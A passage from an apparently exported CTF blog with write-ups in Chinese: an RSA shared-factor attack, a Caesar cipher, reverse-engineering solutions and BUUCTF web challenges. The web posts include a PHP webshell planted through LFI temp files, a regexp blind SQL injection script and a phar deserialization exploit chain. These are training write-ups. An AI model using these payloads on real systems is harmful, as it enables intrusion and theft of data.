20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932 n7 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137 c7 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179 n8 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191 c8 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006 n9 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941 c9 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934 n10 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491 c10 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869 n11 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019 c11 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467 n12 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299 c12 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971 n13 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551 c13 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175 n14 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987 c14 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457 n15 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837 c15 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842 n16 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451 c16 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724 n17 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499 c17 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024 n18 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973 c18 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887 n19 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603 c19 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889 n20 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659 c20 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346 n=[n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19,n20] for i in range(len(n)): for j in range(i+1,len(n)): if(gmpy2.gcd(n[i],n[j])!=1): print(i,j) 输出：4 17 所以n5和n18存在最大公约数 解密脚本 import gmpy2 import libnum e = 65537 n1 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973 c1 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887 n2 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067 c2 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357 p = gmpy2.gcd(n1, n2) q = n1 // p m = gmpy2.powmod(c1, gmpy2.invert(e, (p-1)*(q-1)), n1) print(libnum.n2s(int(m))) b'flag{abdcbe5fd94e23b3de429223ab9c2fdf}' ","link":"https://scarecr0w7.github.io/post/cryptoorbuuctf-rsa5/"},{"title":"Crypto｜Buuctf 大帝的密码武器","content":"题目.txt 公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。 以下密文被解开后可以获得一个有意义的单词：FRPHEVGL 你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。 密文.txt ComeChina 题目.txt提到的为凯撒密码，凯撒密码核心就是移位，所以可以爆破位移的位数 脚本： str1 = 'FRPHEVGL' str2 = str1.lower() num = 1 for i in range(26): print(&quot;{:&lt;2d}&quot;.format(num),end = ' ') for j in str2: if(ord(j)+num &gt; ord('z')): print(chr(ord(j)+num-26),end='') else: print(chr(ord(j)+num),end='') num += 1 print('') 1 gsqifwhm 2 htrjgxin 3 iuskhyjo 4 jvtlizkp 5 kwumjalq 6 lxvnkbmr 7 mywolcns 8 nzxpmdot 9 oayqnepu 10 pbzrofqv 11 qcaspgrw 12 rdbtqhsx 13 security 14 tfdvsjuz 15 ugewtkva 16 vhfxulwb 17 wigyvmxc 18 xjhzwnyd 19 ykiaxoze 20 zljbypaf 21 amkczqbg 22 bnldarch 23 comebsdi 24 dpnfctej 25 eqogdufk 26 frphevgl 最后可以看出来只有位移13位时像是一个单词，所以密钥为13，再对密文加密 PbzrPuvan ","link":"https://scarecr0w7.github.io/post/cryptoorbuuctf-da-di-de-mi-ma-wu-qi/"},{"title":"Reverse｜[GXYCTF2019]luck_guy","content":" ida64打开文件，搜索字符串 进入please input a lucky number伪代码 输入数字进入patch_me(v4);，输入数字为偶数进入get_flag()函数 unsigned __int64 get_flag() { unsigned int v0; // eax char v1; // al signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+8h] [rbp-38h] __int64 s; // [rsp+10h] [rbp-30h] char v6; // [rsp+18h] [rbp-28h] unsigned __int64 v7; // [rsp+38h] [rbp-8h] v7 = __readfsqword(0x28u); v0 = time(0LL); srand(v0); for ( i = 0; i &lt;= 4; ++i ) { switch ( rand() % 200 ) { case 1: puts(&quot;OK, it's flag:&quot;); memset(&amp;s, 0, 0x28uLL); strcat((char *)&amp;s, f1); strcat((char *)&amp;s, &amp;f2); printf(&quot;%s&quot;, &amp;s); break; case 2: printf(&quot;Solar not like you&quot;); break; case 3: printf(&quot;Solar want a girlfriend&quot;); break; case 4: v6 = 0; s = 0x7F666F6067756369LL; strcat(&amp;f2, (const char *)&amp;s); break; case 5: for ( j = 0; j &lt;= 7; ++j ) { if ( j % 2 == 1 ) v1 = *(&amp;f2 + j) - 2; else v1 = *(&amp;f2 + j) - 1; *(&amp;f2 + j) = v1; } break; default: puts(&quot;emmm,you can't find flag 23333&quot;); break; } } return __readfsqword(0x28u) ^ v7; } flag为f1+f2，f1已知为GXY{do_not_，所以需要求f2 switch case需要的顺序为：case 4、case 5、case 1 s = 9180147350284624745LL; ，按H转为十六进制为0x7F666F6067756369LL;，使用时需要逆序 脚本： flag='GXY{do_not_' f2=[0x69,0x63,0x75,0x67,0x60,0x6f,0x66,0x7f] v1=[] for i in range(8): if i%2==1: v1.append(f2[i]+i-2) else: v1.append(f2[i]+i-1) f2[i]=v1[i]-i flag+=chr(f2[i]) print(flag) GXY{do_not_hate_me} ","link":"https://scarecr0w7.github.io/post/reverseorgxyctf2019luck_guy/"},{"title":"Web｜Buuctf-[NPUCTF2020]ezinclude","content":" 查看源码提示md5(secret.secret.secret.name)===$pass cookie中存在hash，hash随着name的变化而变化 hash填入pass参数请求跳转到404页面 使用burpsuite发包，提示存在flflflflag.php页面 flag不在此页面，并且页面存在文件包含漏洞 读取flflflflag.php页面源码 &lt;html&gt; &lt;head&gt; &lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; window.location.href=&quot;404.html&quot;; &lt;/script&gt; &lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt; &lt;/head&gt; &lt;&gt; &lt;body&gt; &lt;?php $file=$_GET['file']; if(preg_match('/data|input|zip/is',$file)){ die('nonono'); } @include($file); echo 'include($_GET[&quot;file&quot;])'; ?&gt; &lt;/body&gt; &lt;/html&gt; 没有什么有用的信息，扫描一下目录看还有哪些文件 config.php &lt;?php $secret='%^$&amp;$#fffdflag_is_not_here_ha_ha'; ?&gt; dir.php &lt;?php var_dump(scandir('/tmp')); ?&gt; php临时文件包含 PHP LFI 利用临时文件 Getshell 姿势 在tmp目录下写入webshell 脚本： import requests from io import BytesIO #BytesIO实现了在内存中读写bytes payload = &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot; data={'file': BytesIO(payload.encode())} url=&quot;http://848f5f75-1ea0-4f62-99cc-c042fc28b0d8.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot; r=requests.post(url=url,files=data,allow_redirects=False) 查看dir.php目录获取文件名 burpsuite发包 POST /flflflflag.php?file=/tmp/php8Heo05 HTTP/1.1 Host: 848f5f75-1ea0-4f62-99cc-c042fc28b0d8.node4.buuoj.cn:81 Content-Type: application/x-www-form-urlencoded Content-Length: 14 cmd=phpinfo(); 发现flag flag{7eaa471d-f287-434a-9071-97639caa7a01} ","link":"https://scarecr0w7.github.io/post/weborbuuctf-npuctf2020ezinclude/"},{"title":"Web｜Buuctf [NCTF2019]SQLi","content":" 直接给出了查询语句 select * from users where username='' and passwd='' 构造语句查询，发现有过滤 fuzz一下，很多参数都被过滤 robots协议下发现hint.txt文件 hint.txt文件，有被过滤的参数，但是没有过滤&quot;、|和\\，并且提示只要密码与admin的密码相同就可以获得flag 解题思路 无引号闭合：可以利用转义符 注释符#和-- -：%00作为截断字符可以代替 爆破字符：利用regexp（正则匹配）注入配合 ^ 盲注入 payload username=\\&amp;passwd=||1;%00 # select * from users where username='\\' and passwd='||1;%00' 当页面正确时响应页面会跳转到welcome.php 正则爆破 payload username=\\&amp;passwd=||passwd/**/regexp/**/&quot;^x&quot;;%00 以x去匹配flag，以x开头就匹配成功 脚本： import requests from urllib import parse import string url = 'http://9dcb13a9-12f1-4b96-b215-7288eab945ae.node4.buuoj.cn:81/' num = 0 flag = '' string= string.ascii_lowercase + string.digits + '_'# flag是由小写字母数字和_组成 for i in range (1,30): if num == 1 : break for j in string: data = { &quot;username&quot;:&quot;\\\\&quot;, &quot;passwd&quot;:&quot;||/**/passwd/**/regexp/**/\\&quot;^{}\\&quot;;{}&quot;.format((flag+j),parse.unquote('%00')) } res = requests.post(url=url,data=data) if 'welcome' in res.text: flag += j print(flag) break if j=='_' and 'welcome' not in res.text: break you_will_never_know7788990 得到密码后以任意用户使用admin密码登录即可获得flag flag{988dce50-d7d0-4456-b6c8-e4fe4abc2111} ","link":"https://scarecr0w7.github.io/post/weborbuuctf-nctf2019sqli/"},{"title":"Web｜[SWPUCTF 2018]SimplePHP","content":" 访问是一个文件上传页面，点击查看文件页面 可以发现特殊的链接，应该存在文件包含 http://dfef288e-1b73-48e0-9458-a4e733c40c38.node4.buuoj.cn:81/file.php?file= 查看源码发现一些文件，页面内容提示flag在f1ag.php中 index.php file.php upload_file.php f1ag.php 直接包含f1ag.php文件，提示hacker！，应该是文件名被过滤 查看其他文件内容 代码审计 file.php &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include 'function.php'; include 'class.php'; ini_set('open_basedir','/var/www/html/'); $file = $_GET[&quot;file&quot;] ? $_GET['file'] : &quot;&quot;; if(empty($file)) { echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; } $show = new Show(); if(file_exists($file)) { $show-&gt;source = $file; $show-&gt;_show(); } else if (!empty($file)){ die('file doesn\\'t exists.'); } ?&gt; 在file.php中发现其他文件 function.php class.php 经过查看主要有用的信息在class.php和funcion.php中 class.php &lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-&gt;str = $name; } public function __destruct() { $this-&gt;test = $this-&gt;str; echo $this-&gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; } public function __toString() { $content = $this-&gt;str['str']-&gt;source; return $content; } public function __set($key,$value) { $this-&gt;$key = $value; } public function _show() { if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) { die('hacker!'); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; } } } class Test { public $file; public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { return $this-&gt;get($key); } public function get($key) { if(isset($this-&gt;params[$key])) { $value = $this-&gt;params[$key]; } else { $value = &quot;index.php&quot;; } return $this-&gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } ?&gt; function.php &lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;'; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) { //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo '&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;'; return false; } } } ?&gt; 在function.php中发现，上传文件是白名单验证，并且上传的文件会被重命名在最后加上jpg后缀放到upload文件夹中，所以这里并不能绕过上传文件读取f1ag.php文件，需要找其他方法 在class.php文件中class show有提示//$this-&gt;source = phar://phar.jpg，所以这里应该是phar伪协议引起的反序列化漏洞 反序列化链 Test::file_get中text=base64encode(filegetcontents(text = base64_encode(file_get_contents(text=base64e​ncode(fileg​etc​ontents(value));，可以读取f1ag.php文件 Test 类中有利用链： __get –&gt; get –&gt; file_get，__get() 用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 调用__get方法：show::__tostring中，$content = $this-&gt;str['str']-&gt;source;，__toString() 把类当作字符串使用时触发，Test类中没有source变量，所以可以触发 调用__tostring方法：C1e4r::__destruct中，echo $this-&gt;test;，会将类进行输出，且__destruct() 是对象被销毁时触发，所以一定会触发 反序列化链 C1e4r::destruct() --&gt; Show::toString() --&gt; Test::__get() 脚本 &lt;?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $a=new C1e4r(); $b=new Show(); $c=new Test(); $c-&gt;params['source']='/var/www/html/f1ag.php'; $b-&gt;str['str']=$c; $a-&gt;str=$b; $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $phar-&gt;setMetadata($a); //将自定义的$a存入meta-data,最后被反序列化 $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 生成phar.phar文件改为phar.jpg后上传 获取文件名 上传文件后文件被重新命名，可以直接访问upload目录查看文件名 使用phar伪协议包含上传的文件 http://86d1a207-19cc-4bbf-9661-1f319defe08c.node4.buuoj.cn:81/file.php?file=phar://upload/42574e9d70ad4a54c530fd9a294a46dc.jpg 得到base64编码的字符串 PD9waHAgDQoJLy8kYSA9ICdmbGFne2YwMmFjMTRkLWU4MDMtNDM0OC1iZTcwLThhMGMyNDgyNDI1M30nOw0KID8+DQoNCg== 解码得到flag &lt;?php //$a = 'flag{f02ac14d-e803-4348-be70-8a0c24824253}'; ?&gt; ","link":"https://scarecr0w7.github.io/post/weborswpuctf-2018simplephp/"},{"title":"Web｜[watevrCTF-2019]Cookie Store","content":" 需要购买flag cookie即可得到flag，但是金额不足，使用burp suite抓包 Cookie: session=eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFtdfQ== 看到cookie像是base64编码后的数据，解码查看 {&quot;money&quot;: 50, &quot;history&quot;: []} 所以金额藏在cookie中，更改金额大于100，编码后重新发包 在响应包中有session eyJtb25leSI6IDUwLCAiaGlzdG9yeSI6IFsiZmxhZ3swYzU5MDNjZC0xMzgyLTQyYzEtYjUyNC05NTYwNDNmYjE2MzN9XG4iXX0= base64解码 {&quot;money&quot;: 50, &quot;history&quot;: [&quot;flag{0c5903cd-1382-42c1-b524-956043fb1633}\\n&quot;]} flag{0c5903cd-1382-42c1-b524-956043fb1633} ","link":"https://scarecr0w7.github.io/post/weborwatevrctf-2019cookie-store/"},{"title":"Reverse｜Buuctf SimpleRev","content":" ida64打开，查看伪代码 unsigned __int64 Decry() { char v1; // [rsp+Fh] [rbp-51h] int v2; // [rsp+10h] [rbp-50h] int v3; // [rsp+14h] [rbp-4Ch] int i; // [rsp+18h] [rbp-48h] int v5; // [rsp+1Ch] [rbp-44h] char src[8]; // [rsp+20h] [rbp-40h] __int64 v7; // [rsp+28h] [rbp-38h] int v8; // [rsp+30h] [rbp-30h] __int64 v9; // [rsp+40h] [rbp-20h] __int64 v10; // [rsp+48h] [rbp-18h] int v11; // [rsp+50h] [rbp-10h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); *(_QWORD *)src = 357761762382LL;// 数据转为16进制为‘0x534c43444e’数据在内存中是小端顺序，高位在高地址处，低位在低地址处，故实际的字符顺序应为'0x4e44434c53'转为字符为'NDCLS' v7 = 0LL; v8 = 0; v9 = 512969957736LL; // 同理解出为'hadow' v10 = 0LL; v11 = 0; text = (char *)join(key3, &amp;v9); // key3='kills' ;这个join函数，就是把key3和v9两个字符串相连即'killshadow' strcpy(key, key1); strcat(key, src); // key1 = 'ADSFK',key = 'ADSFKNDCLS' v2 = 0; v3 = 0; getchar(); v5 = strlen(key); // v5=10 for ( i = 0; i &lt; v5; ++i ) { if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;= 90 )// 将key的字符转为小写的算法,即key = 'adsfkndcls' key[i] = key[v3 % v5] + 32; ++v3; } printf(&quot;Please input your flag:&quot;, src); while ( 1 ) { v1 = getchar(); if ( v1 == 10 ) break; if ( v1 == 32 ) { ++v2; } else { if ( v1 &lt;= 96 || v1 &gt; 122 ) { if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 ) str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97; } else { str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97; } if ( !(v3 % v5) ) putchar(32); ++v2; } } if ( !strcmp(text, str2) ) puts(&quot;Congratulation!\\n&quot;); else 